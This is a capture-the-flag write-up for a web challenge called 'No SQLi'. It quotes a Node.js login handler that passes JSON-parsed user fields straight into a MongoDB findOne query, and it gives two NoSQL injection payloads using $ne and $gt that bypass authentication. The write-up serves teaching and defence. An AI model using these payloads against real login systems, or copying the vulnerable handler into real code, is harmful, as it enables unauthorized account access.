---
type: writeup
source: CyLab
event: CyLab Academy
category: Web
difficulty:
status: solved
flags: kept
tags: [writeup, web]
---

# No SQLi

## Task
Can you try to get access to this website to get the flag?

You can download the source here.

Hint 1: Not only SQL injection exist but also NonSQL injection exists.

Hint 2: Make sure you look at everything the server is sending back.

## Approach
I was given a live instance as well as the source code. Inspecting the server backend ([server.js](No SQLi/server.js)), I could see it uses MongoDB (via Mongoose and an in-memory `mongodb-memory-server`). So I did some research on MongoDB and set out to enumerate it for a NoSQL injection.

I also found something interesting in the program: the server seeds one initial user whose password is a random 16-hex-character value, so guessing the password directly is not the path:

```javascript
// Store initial user
const initialUser = new User({
  firstName: "pico",
  lastName: "player",
  email: "picoplayer355@cylabacademy.org",
  password: crypto.randomBytes(16).toString("hex").slice(0, 16),
});
await initialUser.save();
```

## Solution
The login handler is the vulnerable spot. It parses the `email` and `password` fields as JSON when they start with `{` and end with `}`, then passes the parsed object straight into `User.findOne`:

```javascript
const user = await User.findOne({
  email:
    email.startsWith("{") && email.endsWith("}")
      ? JSON.parse(email)
      : email,
  password:
    password.startsWith("{") && password.endsWith("}")
      ? JSON.parse(password)
      : password,
});
```

That means you can inject a Mongo query operator instead of a literal value. Submitting a JSON object with a `$ne` (not-equal) operator matches any document, bypassing authentication. Because we know the seeded email, we only need to bypass the password:

Request body (the front-end `index.html` sends JSON to `POST /login`):

```json
{"email":"picoplayer355@cylabacademy.org","password":"{\"$ne\":null}"}
```

Or bypass both fields:

```json
{"email":"{\"$gt\":\"\"}","password":"{\"$gt\":\"\"}"}
```

`findOne` returns the user, and the JSON response includes the user's `token` field, which the schema defaults to `"{{Flag}}"` (populated with the real flag on the live instance). Hint 2 points here: the flag comes back in the server response body, which the browser stores in session storage before redirecting to `/admin`.

## Flag
Not recorded verbatim in PWN notes. The flag is returned in the `token` field of the `/login` JSON response on the live instance.

## Lessons
- NoSQL injection is the MongoDB analogue of SQL injection: instead of breaking query syntax, you smuggle query operators (`$ne`, `$gt`, `$regex`) into fields the app feeds directly into a query.
- Parsing user input as JSON and dropping it into `findOne` without validation is the root cause. User-controlled values must be forced to the expected type (string), never allowed to become query objects.
- Always read the full server response. The flag was handed back in the login response body, not shown in the rendered page.

## Files
- [server.js](No SQLi/server.js), [index.html](No SQLi/index.html), [admin.html](No SQLi/admin.html), [package.json](No SQLi/package.json)
- `package-lock.json` left in ~/PWN (skipped).
